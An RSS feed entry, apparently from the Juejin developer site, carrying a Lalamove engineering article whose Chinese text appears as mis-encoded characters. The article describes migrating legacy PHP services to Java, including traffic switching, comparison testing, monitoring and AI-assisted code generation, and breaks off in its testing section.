<?xml version="1.0" encoding="UTF-8"?><rss version="2.0">  <channel>      <title>æ˜é‡‘æ–‡ç« æ¨è</title>      <link>https://juejin.cn/recommended?sort=newest</link>      <description>ä¸€ä¸ªå¸®åŠ©å¼€å‘è€…æˆé•¿çš„ç¤¾åŒº</description>      <generator>python juejin_recom.py @Pi20</generator>      <item>    <title><![CDATA[Lalamove PHP æœåŠ¡ Java åŒ–å¤§å‹é¡¹ç›®çš„å®è·µä¹‹è·¯]]></title>    <link>https://juejin.cn/post/7582517982195220523</link>    <guid>https://juejin.cn/post/7582517982195220523</guid>    <pubDate>2025-12-12T02:59:27.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7582517982195220523" data-draft-id="7581765536373276681" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Lalamove PHP æœåŠ¡ Java åŒ–å¤§å‹é¡¹ç›®çš„å®è·µä¹‹è·¯"/> <meta itemprop="keywords" content="Java,PHP"/> <meta itemprop="datePublished" content="2025-12-12T02:59:27.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="è´§æ‹‰æ‹‰æŠ€æœ¯"/> <meta itemprop="url" content="https://juejin.cn/user/1768489241815070"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Lalamove PHP æœåŠ¡ Java åŒ–å¤§å‹é¡¹ç›®çš„å®è·µä¹‹è·¯
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1768489241815070/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    è´§æ‹‰æ‹‰æŠ€æœ¯
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-12T02:59:27.000Z" title="Fri Dec 12 2025 02:59:27 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-12
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    32
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»1åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body cache result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>ä½œè€…ï¼šTGE-Transaction-å”å°äº‘ï¼ˆTerry Tangï¼‰</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/f456ff44a61648339f447ca8c097db11~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6LSn5ouJ5ouJ5oqA5pyv:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766114724&amp;x-signature=Uu7PR0xxv%2Bp17iz0SAhAl3gbJyM%3D" alt="" loading="lazy"/></p>
<h2 data-id="heading-0">èƒŒæ™¯</h2>
<p>Lalamoveè‡ª2013å¹´èµ·å°±å¼€å§‹åŸºäºPHPæ„å»ºç³»ç»Ÿï¼Œä¹‹åé€æ­¥è¿ç§»è‡³Javaã€‚éšç€æµ·å¤–ä¸šåŠ¡å¢é•¿ï¼Œä¸šåŠ¡å¤æ‚åº¦å’ŒæŠ€æœ¯å¤æ‚åº¦ä¹Ÿå¿«é€Ÿä¸Šå‡ã€‚PHPé—ç•™æœåŠ¡ï¼Œæˆä¸ºç³»ç»Ÿé¡½ç–¾ï¼š</p>
<ul>
<li>
<p>æŠ€æœ¯æ”¯æŒå±‚é¢ï¼šå…¬å¸æœ€æ–°åŸºå»ºä»¥Javaä¸ºä¸»ï¼Œç¼ºå°‘PHPæ”¯æŒã€‚</p>
</li>
<li>
<p>PHPè‡ªèº«ç‰¹æ€§ï¼šç¨³å®šæ€§ï¼Œæ•ˆç‡ï¼Œæ‰©å±•æ€§ç­‰é—®é¢˜å›°æ‰°ç ”å‘å›¢é˜Ÿã€‚</p>
</li>
</ul>
<p>å› æ­¤ï¼Œæˆ‘ä»¬äº24å¹´åº•å¯åŠ¨ä»£å·ä¸ºâ€œP2J"çš„é¡¹ç›®ï¼Œæ—¨åœ¨1å¹´å†…å®Œæˆæ ¸å¿ƒé“¾è·¯ä¸­å…¨éƒ¨æ•°åä¸ªå…³é”®PHPæœåŠ¡çš„JavaåŒ–ã€‚é¡¹ç›®èŒƒå›´åºå¤§ï¼Œå…±1000+PHPæ¥å£éœ€è¦JavaåŒ–ï¼Œä¸Šæ¸¸100+ä¸ªæœåŠ¡éœ€è¦å®Œæˆ1200+æ¥å…¥æ–°çš„Javaæ¥å£åœºæ™¯ã€‚å‡ ä¹æ¶‰åŠåˆ°Lalamoveå…¨éƒ¨ä¸šåŠ¡å›¢é˜Ÿã€‚</p>
<p>é¡¹ç›®æœ€ç»ˆåœ¨æ—¶é—´ï¼Œæ•ˆç‡ï¼Œè´¨é‡æ–¹é¢ä¼˜äºé¢„æœŸçš„æƒ…å†µä¸‹å®Œæˆäº¤ä»˜ã€‚è¿‡ç¨‹ä¸­é‡åˆ°çš„é—®é¢˜å’Œè§£å†³æ–¹æ¡ˆï¼Œå€¼å¾—å’Œå¤§å®¶åˆ†äº«ã€‚</p>
<h2 data-id="heading-1">é¡¹ç›®å®æ–½çš„æŒ‘æˆ˜</h2>
<p>ä»PHPæ¥å£ç»´åº¦çœ‹ï¼Œæ¨è¿›èŠ‚å¥ç®€å•æ˜äº†ï¼šPHPæ¥å£å…ˆå®ŒæˆJavaåŒ–ï¼Œä¸Šæ¸¸æœåŠ¡æ‹©æœºå®Œæˆæ–°æ¥å£æ¥å…¥ï¼Œå¾…æ‰€æœ‰æ¥å…¥å®Œæˆï¼ŒæœåŠ¡å³å¯ä¸‹çº¿ã€‚ä½†æ˜¯ï¼Œä»å·¥ç¨‹çš„è§’åº¦çœ‹ï¼Œä¸€ä¸ªå¤§å‹é¡¹ç›®çš„å®æ–½ï¼Œä¸ä»…ä»…æ˜¯ç®€å•çš„Javaè¯­è¨€ç¿»è¯‘ï¼Œæ˜¯ä¸€ä¸ªç³»ç»Ÿå·¥ç¨‹ã€‚å¯¹æ—¶é—´ï¼Œæ•ˆç‡ï¼Œè´¨é‡çš„æœŸæœ›ï¼Œé™¤äº†å¸¸è§çš„æŠ€æœ¯é—®é¢˜æŒ‘æˆ˜ï¼Œä¹Ÿä¼šé¢ä¸´ä¸€ç³»åˆ—å·¥ç¨‹æŒ‘æˆ˜ã€‚</p>
<h3 data-id="heading-2">æŒ‘æˆ˜1 -å¤æ‚åº¦å’Œæ—¶é—´çš„çŸ›ç›¾</h3>
<ul>
<li>
<p>å¤æ‚åº¦ä¸»è¦æ¥æºäºï¼šè§„æ¨¡ï¼Œäººå‘˜ï¼Œä¸šåŠ¡å¤æ‚åº¦ï¼ŒæŠ€æœ¯å¤æ‚åº¦ç­‰ã€‚</p>
</li>
<li>
<p>æœåŠ¡é—´è°ƒç”¨å…³ç³»é”™ç»¼å¤æ‚ï¼Œä»»åŠ¡ä¹‹é—´å­˜åœ¨ä¾èµ–è€¦åˆï¼Œå½±å“èµ„æºçš„é«˜æ•ˆåˆ©ç”¨ã€‚</p>
</li>
</ul>
<p><img src="https://huolala.feishu.cn/space/api/box/stream/download/asynccode/?code=ZDE5MDUxZDVjOWYzYWE1M2IxOGFlYTU3YWMyOGRlYThfTmhLSGI5N2NJaEJnUTNXTWRwVXI2SkNjczBCQWFyeXJfVG9rZW46QW0xRGJvSTNDbzNWdE54ZDl1UmMzakxjbm9iXzE3NjU1MDQxNjk6MTc2NTUwNzc2OV9WNA" alt="" loading="lazy"/></p>
<p>æ¡ˆä¾‹ï¼šOrderInfo.get_order_info æ¥å£ï¼ŒjavaåŒ–ä¹‹åï¼Œæœ‰å¤šä¸ªä¸Šæ¸¸æœåŠ¡éœ€è¦æ¥å…¥ã€‚è¯¥æ¥å£æ­£å¸¸æ’æœŸï¼Œä»å¼€å‘åˆ°å®Œæˆåˆ‡æµï¼Œéœ€è¦1ä¸ªåŠæœˆã€‚å¦‚ä¸²è¡Œæ¨è¿›ï¼Œæ¯ä¸ªä¸Šæ¸¸æ¥å…¥è‡³å°‘éœ€è¦ç­‰å¾…1ä¸ªåŠæœˆã€‚</p>
<p>é—®é¢˜ï¼šå¦‚ä½•ä½¿ç”¨æœ€å°‘çš„èµ„æºï¼ŒæŒ‰æ—¶äº¤ä»˜æœ€å¤šçš„ä»»åŠ¡ï¼Ÿ</p>
<h3 data-id="heading-3">æŒ‘æˆ˜2 - ç¨³å®šæ€§ä¸æ•ˆç‡çš„çŸ›ç›¾</h3>
<ul>
<li>
<p>PHPä»£ç ç»è¿‡10å¤šå¹´è¿­ä»£ï¼Œå¤§é‡ä»£ç å±å±±ï¼Œä¸ªåˆ«æ ¸å¿ƒæœåŠ¡ï¼Œæ— æ•ˆä»£ç ä»£ç å æ¯”è¶…è¿‡30%ã€‚</p>
</li>
<li>
<p>å¤šä¸ªä»»åŠ¡å¹¶è¡Œä¸Šçº¿ï¼Œåˆ‡æµç­‰ï¼Œæ”¾å¤§äº†é“¾è·¯å‡ºé”™æ¦‚ç‡ã€‚</p>
<p>æ¡ˆä¾‹ï¼šä¸‹å•é“¾è·¯ï¼Œ25å¹´2æœˆ51ä¸ªæ¥å£åŒæ—¶åˆ‡æµã€‚ä»»ä½•é—®é¢˜éƒ½ä¼šç›´æ¥å½±å“ä¸‹å•é“¾è·¯å¯ç”¨ï¼ŒP0äº‹æ•…å¦¥å¦¥çš„ã€‚</p>
<p><img src="https://huolala.feishu.cn/space/api/box/stream/download/asynccode/?code=MTJiNDM1YjQwMDdmYzI0MWZhNGM1NDQ5Y2MyZGYwNjVfamx1czU1OFlRdkJlM3dyRU5ZMDczNlk1blkyaUhFeVNfVG9rZW46WXZwVGJvVXZEb3RpeWt4Y1VIWmNXUVVDbkNoXzE3NjU1MDQxNjk6MTc2NTUwNzc2OV9WNA" alt="" loading="lazy"/></p>
</li>
</ul>
<p>é—®é¢˜ï¼šå¦‚ä½•åœ¨å¤§é‡å¹²æ‰°ï¼Œå¹¶è¡Œæƒ…å†µä¸‹ï¼Œä¾ç„¶ä¿éšœæœ€ä½³ç¨³å®šæ€§ï¼Ÿ</p>
<h2 data-id="heading-4">è§£å†³æ–¹æ¡ˆ</h2>
<p>è¿‡å»æˆ‘ä»¬ä¹Ÿåšè¿‡å¤šæ¬¡ä¸­å°è§„æ¨¡çš„JavaåŒ–è¿ç§»é¡¹ç›®ï¼Œé€šå¸¸æ˜¯PHPæœåŠ¡è´Ÿè´£å›¢é˜Ÿä¸»å¯¼ï¼Œä¸€æ¬¡æœ€å¤šæ¶‰åŠåˆ°å‡ ä¸ªæœåŠ¡ï¼Œä¸‹æ¸¸PHPæœåŠ¡æ”¹é€ å®Œæˆåï¼Œä¸Šæ¸¸æœåŠ¡åœ¨æŸä¸ªä¸ç¡®å®šçš„æ—¶é—´æ¥å…¥ã€‚å¯¼è‡´æ•´ä½“æ—¶é—´é•¿ï¼Œè´¨é‡ä¸Šå‚å·®ä¸é½ã€‚æˆ‘ä»¬å¸å–äº†è¿‡å»Javaè¿ç§»çš„æ•™è®­ï¼Œæœ‰é’ˆå¯¹æ€§åœ°åˆ¶å®šæˆ‘ä»¬çš„è§£å†³æ–¹æ¡ˆã€‚</p>
<ul>
<li>
<p>æŠ€æœ¯æ–¹æ¡ˆï¼šè¯†åˆ«å…¨å±€é€šç”¨æŠ€æœ¯éœ€æ±‚ï¼Œè¦åšåˆ°ç®€å•ï¼Œæ ‡å‡†åŒ–ï¼Œå¯å¤ç”¨ã€‚</p>
</li>
<li>
<p>è´¨é‡ä¿éšœæ–¹æ¡ˆï¼šå»ºç«‹è´¨é‡ä¿éšœä½“ç³»ï¼Œå…¼é¡¾æµ‹è¯•å¹¿åº¦å’Œæ·±åº¦ã€‚</p>
</li>
<li>
<p>é¡¹ç›®ç®¡ç†ï¼šå…¨é¢çš„é¡¹ç›®ç®¡ç†è®¡åˆ’ï¼Œé‡ç‚¹å…³æ³¨é£é™©ç®¡ç†å’Œè¿›åº¦ç®¡ç†ã€‚</p>
</li>
</ul>
<h3 data-id="heading-5">æŠ€æœ¯æ–¹æ¡ˆ</h3>
<h4 data-id="heading-6">å…¨å±€åˆ‡æµæ–¹æ¡ˆ</h4>
<blockquote>
<p><strong>åˆ‡æµæ–¹æ¡ˆä¸¤ä¸ªè®¾è®¡åŸåˆ™ï¼š</strong></p>
<ol>
<li>
<p>å¯¹ä¸Šæ¸¸æ— æ„Ÿï¼Œå¹³æ»‘åˆ‡æµ</p>
</li>
<li>
<p>Javaæ–°å¥‘çº¦æœ€å¤§ç¨‹åº¦å’ŒPHPä¸€è‡´ï¼Œé™ä½æ¥å…¥æˆæœ¬</p>
</li>
</ol>
</blockquote>
<p>åŸºäºåˆ‡æµæ–¹æ¡ˆåŸåˆ™ï¼Œç»Ÿä¸€æä¾›åˆ‡æµæ–¹æ¡ˆï¼š</p>
<p><img src="https://huolala.feishu.cn/space/api/box/stream/download/asynccode/?code=MDcyODYxMzM3NWIwMTMzOTc5OTQzZWZhNzNmZGI1MTBfeVpGT2N5QXdJNlVWb1hKRDVRZUJ1S09uWmV0eWRnWnNfVG9rZW46UmZZVmJZUUdab3BmWUR4S3R3ZmN3OVhIbmNlXzE3NjU1MDQxNjk6MTc2NTUwNzc2OV9WNA" alt="" loading="lazy"/></p>
<h4 data-id="heading-7">å…¨å±€å¯¹æ¯”æ–¹æ¡ˆ</h4>
<p>Lalamove/è´§æ‹‰æ‹‰å†…éƒ¨è‡ªç ”çš„å½•åˆ¶å’Œå¯¹æ¯”å·¥å…·ä¸ºæˆ‘ä»¬æä¾›äº†å½•åˆ¶å¯¹æ¯”èƒ½åŠ›ã€‚å¤§äº60%çš„PHPæ¥å£é€šè¿‡å·¥å…·å¯¹æ¯”åï¼Œå…¨ç¨‹æ— éœ€QAä»‹å…¥ï¼Œç›´æ¥ä¸Šçº¿ã€‚ä¿éšœè´¨é‡çš„åŒæ—¶ï¼Œèƒ½æå¤§å‡å°‘ç ”å‘å’ŒQAèµ„æºã€‚</p>
<p><img src="https://huolala.feishu.cn/space/api/box/stream/download/asynccode/?code=ZDc3M2MxMWFkM2RhNDQ4ODk5NGRiYTNhZjUyMDJhNmRfbWpKRXd1bExnTU5LUTg4VWZBSHNOUUtiZzNjdTY2dzdfVG9rZW46SVQwT2JDZVZ3b25JaHR4Y3FBb2NhMGhSblVlXzE3NjU1MDQxNjk6MTc2NTUwNzc2OV9WNA" alt="" loading="lazy"/></p>
<h4 data-id="heading-8">å…¨å±€ç›‘æ§&amp;å‘Šè­¦ç³»ç»Ÿ</h4>
<p>è¯†åˆ«ç ”å‘æµç¨‹å¼•è¿›çš„ç›‘æ§ç›²ç‚¹ï¼Œæ—©å‘ç°ï¼Œæ—©è§£å†³ã€‚</p>
<p><img src="https://huolala.feishu.cn/space/api/box/stream/download/asynccode/?code=YzMzOWYxYTcxNTg4NDY0ZjEzMmRmNTIyMDI4MjIxZGRfWWhGZXY4cTBac011UG4wMFhaVG5ORkpZQkQ0c216NHNfVG9rZW46VVlGQmJSMUZYb2dFOG14c2RlZmNyZXRqbkJkXzE3NjU1MDQxNjk6MTc2NTUwNzc2OV9WNA" alt="" loading="lazy"/><img src="https://huolala.feishu.cn/space/api/box/stream/download/asynccode/?code=NzU2NGJiNjU3NmM3ZmQ4YWNmZTQ3YWFlYWFlNmNkYzJfWnBMZzB2R2ozWVpwY2wwcDFBeDRsS1ZwZEpVWVN6N1FfVG9rZW46U3daT2JESzBqb09QZml4Z3o2aWM1UERSbnZiXzE3NjU1MDQxNjk6MTc2NTUwNzc2OV9WNA" alt="" loading="lazy"/></p>
<h4 data-id="heading-9">é‡æ„</h4>
<p>é¿å…ç‚«æŠ€å¼é‡æ„ï¼Œé¼“åŠ±å¯æ§çš„é¢†åŸŸé‡æ„ã€‚é€šè¿‡é‡æ„ï¼Œæ•´ä½“ä¸Šå‡å°‘äº†20%çš„ä»»åŠ¡é‡ï¼š</p>
<ul>
<li>
<p>é¿å…PHPæŠ€æœ¯å€ºåŠ¡ä¼ é€’åˆ°æ–°çš„JavaæœåŠ¡ï¼Œå®ç°æœåŠ¡é¢†åŸŸåŒ–ã€‚</p>
</li>
<li>
<p>åˆå¹¶+ç²¾ç®€é€»è¾‘</p>
</li>
</ul>
<h4 data-id="heading-10">AIææ•ˆ</h4>
<ul>
<li>AIå·¥å…·éå¸¸é€‚åˆè·¨è¯­è¨€è¿ç§»é¡¹ç›®ï¼Œä½¿ç”¨åœºæ™¯å¤šæ ·ï¼Œè¦†ç›–äº†ç ”å‘ç”Ÿå‘½å‘¨æœŸã€‚åœ¨æœ¬é¡¹ç›®ä¸­ï¼ŒAIç”Ÿæˆäº†çº¦7%ï¼ˆ15wè¡Œï¼‰çš„ä»£ç ã€‚</li>
</ul>
<p><img src="https://huolala.feishu.cn/space/api/box/stream/download/asynccode/?code=NWY3NmEwNWY1MWFjNzFmNDJlNGQ3NWZiMDJmYzAyNDJfdlhEWEZHbFVzODlnZEM5UnRjWjh1VDgzWVltcEtic2FfVG9rZW46Smt4YWJIYkxjb2ZYZTl4OEVVaGNTOTRQbjZkXzE3NjU1MDQxNjk6MTc2NTUwNzc2OV9WNA" alt="" loading="lazy"/></p>
<ul>
<li>
<p>AIä½¿ç”¨åœºæ™¯æ¡ˆä¾‹ - å¸æœºç³»ç»Ÿçš„PHPæ¥å£javaåŒ–</p>
<ul>
<li>
<p>æŒ‰ç…§ç¼–ç è§„èŒƒï¼Œé¡¹ç›®æ¶æ„è§„èŒƒï¼Œæ‰‹å·¥å®ç°ä¸€ä¸ªæ¥å£</p>
</li>
<li>
<p>åœ¨Cursorä¸Šé…ç½®User Rulesï¼Œè¦æ±‚Cursorå‚è€ƒå·²å®ç°çš„æ¥å£å’Œè§„èŒƒï¼Œç”Ÿæˆä»£ç </p>
</li>
<li>
<p>å¯¹ç”Ÿæˆçš„ä»£ç å¾®è°ƒï¼Œæµ‹è¯•ï¼Œä¸Šçº¿ã€‚</p>
</li>
<li>
<p>å‡å°‘50%çš„å·¥ä½œé‡ã€‚</p>
</li>
</ul>
</li>
</ul>
<h3 data-id="heading-11">è´¨é‡ä¿éšœ</h3>
<h4 data-id="heading-12">æµ‹è¯•è´¨é‡ä¿éšœä½“ç³»</h4>
<blockquote>
<p><strong>ç›®æ ‡ï¼šå…¨é¢ã€æ·±å…¥ã€é«˜æ•ˆåœ°å®Œæˆæµ‹è¯•äº¤ä»˜</strong></p>
</blockquote>
<p><img src="https://huolala.feishu.cn/space/api/box/stream/download/asynccode/?code=OTNmY2RmNDU3ODEzYjdlNWVjNzdkZDViYThkMjY2NzFfbjNzeEpobXVYcjFLeFN1TVdXZGhsVzA1d05ESUxWN1VfVG9rZW46SjR1d2J0Y2pBb05OMEp4ZHprWmNGaXdQbkNlXzE3NjU1MDQxNjk6MTc2NTUwNzc2OV9WNA" alt="" loading="lazy"/></p>
<h4 data-id="heading-13">æµ‹è¯•æ•ˆç‡å’Œè´¨é‡</h4>
<p><strong>æµ‹è¯•æ•ˆç‡ï¼š</strong></p>
<p>æˆ‘ä»¬é€šè¿‡æå‰è§„åˆ’ã€åŠ¨æ€è°ƒæ•´ã€å·¥å…·ææ•ˆçš„ç­–ç•¥ï¼Œä¿è¯æ•´ä½“çš„æµ‹è¯•è¿›åº¦ï¼š</p>
<p><img src="https://huolala.feishu.cn/space/api/box/stream/download/asynccode/?code=YWI4MGE1ZjgyYTk2MGJjNjc5MGE0YjhmZWEwMTUzYjhfWmtTUG9tMnN5NDRaY0JlWHJnWXI5anNOT0dDMFhWdHZfVG9rZW46RENsUGJ2UXhpb3AyQnN4cUY5cmNvb0E5bjhjXzE3NjU1MDQxNjk6MTc2NTUwNzc2OV9WNA" alt="" loading="lazy"/></p>
<p>**æ¡ˆä¾‹1ï¼š**åŸºäºè‡ªç ”çš„æµ‹è¯•åœºæ™¯ç¼–æ’å·¥å…·Autofluxï¼Œè¿›è¡Œè®¢å•ä¸»æµç¨‹æ–°æ—§æµç¨‹å·¡æ£€ï¼Œæ£€æŸ¥ä¸åŒçš„æ”¯ä»˜æ–¹å¼âœ–ï¸è®¢å•ç±»å‹âœ–ï¸è®¢å•æ“ä½œï¼Œè¦†ç›–æ‰€æœ‰è®¢å•æ ¸å¿ƒé“¾è·¯ã€‚</p>
<p><img src="https://huolala.feishu.cn/space/api/box/stream/download/asynccode/?code=MmNmYTk5YWJlMzdiZDE0ODY5MDMwN2RkODVkNzIxZDRfY0N1VjMwQ1BJVTdCZnhsYjgzclB3VG05bFlwSFZCZmdfVG9rZW46RDg2cWJLaGp2b0xlOGR4MFhoYWNiNXdHbk8zXzE3NjU1MDQxNjk6MTc2NTUwNzc2OV9WNA" alt="" loading="lazy"/></p>
<p><strong>æ¡ˆä¾‹2ï¼š<strong>PHPæ¥å£åœ¨è½¬Javaåï¼ŒåŸæœ‰æ¥å£è‡ªåŠ¨åŒ–å¤±æ´»ï¼Œéœ€è¦è¡¥å……å¯¹åº”æ–°æ¥å£çš„è‡ªåŠ¨åŒ–ç”¨ä¾‹ï¼Œç”¨æ¥åšæ—¥å¸¸å‡†å‡ºçš„æµæ°´çº¿å¡å£æ ¡éªŒï¼Œä»¥OrderInfoæœåŠ¡æ¥å£è‡ªåŠ¨åŒ–ä¸ºä¾‹ï¼Œæœ¬æ¬¡é¡¹ç›®æ–°å¢27ä¸ªæ¥å£ï¼Œä½¿ç”¨Cursorè‡ªåŠ¨ç”Ÿæˆæ¥å£è‡ªåŠ¨åŒ–æµ‹è¯•ç”¨ä¾‹ï¼Œç›¸æ¯”äºP2Jé¡¹ç›®å‰æ‰‹åŠ¨ç¼–å†™çš„è‡ªåŠ¨åŒ–æµ‹è¯•ç”¨ä¾‹ï¼Œç¼–å†™æ•ˆæœæé«˜äº†</strong>10</strong>å€ã€‚é€šè¿‡ä½¿ç”¨Cursorè¡¥å……å®Œå…¨éƒ¨æ–°JavaåŒ–æ¥å£caseèŠ‚çœå·¥æ—¶ï¼š<strong>800+</strong> mandays</p>
<p><img src="https://huolala.feishu.cn/space/api/box/stream/download/asynccode/?code=MjkyMTkxNzQyMWUxOTg4N2ZiN2Q4OGE2Y2FmNzIwZWNfWGxBdWdsVHdDWUR6VGNUcEQza0ZmUzltZXZ2VDhqUWZfVG9rZW46UjI4cmI0S1RMb2xiZ0x4RmVlMWNEVVZtblJmXzE3NjU1MDQxNjk6MTc2NTUwNzc2OV9WNA" alt="" loading="lazy"/></p>
<p><strong>æµ‹è¯•å¹¿åº¦ï¼š</strong></p>
<p>åœ¨å¼€å‘è‡ªæµ‹é˜¶æ®µï¼Œæˆ‘ä»¬æä¾›æµ‹è¯•å·¥å…·ï¼Œèµ‹èƒ½å¼€å‘è‡ªæµ‹ï¼Œæé«˜ææµ‹è´¨é‡</p>
<p><img src="https://huolala.feishu.cn/space/api/box/stream/download/asynccode/?code=YTBhMGFhZWE3OWIzMmY2YmQwZGRlNTU5Y2VhODlmYzNfNkVGR25VbmxJYWFES0NCV0JwVVNIR0FXWWFFUlJTTndfVG9rZW46WmdhWmIzTFljbzh0MmJ4NG9qaGNRTE8ybmtiXzE3NjU1MDQxNjk6MTc2NTUwNzc2OV9WNA" alt="" loading="lazy"/></p>
<p>åœ¨QAæµ‹è¯•é˜¶æ®µï¼Œæˆ‘ä»¬å¯¹å‚ä¸P2Jæµ‹è¯•çš„QAè¿›è¡ŒæŒç»­åŸ¹è®­ï¼Œä¿éšœæµ‹è¯•çš„åŸºçº¿</p>
<p><img src="https://huolala.feishu.cn/space/api/box/stream/download/asynccode/?code=ZDBhYTMyOTA4ZmZiOGMzNWFhZTAyOWIxNGMxOWE0N2NfTVZJQjhNTHhzMFB0UEVHQmxXTUxMeloydnh4eHFEMFZfVG9rZW46TlZueGJ2SEEyb3ZkSWR4SllnR2NmSXdDbkVmXzE3NjU1MDQxNjk6MTc2NTUwNzc2OV9WNA" alt="" loading="lazy"/></p>
<p><strong>æµ‹è¯•æ·±åº¦ï¼š</strong></p>
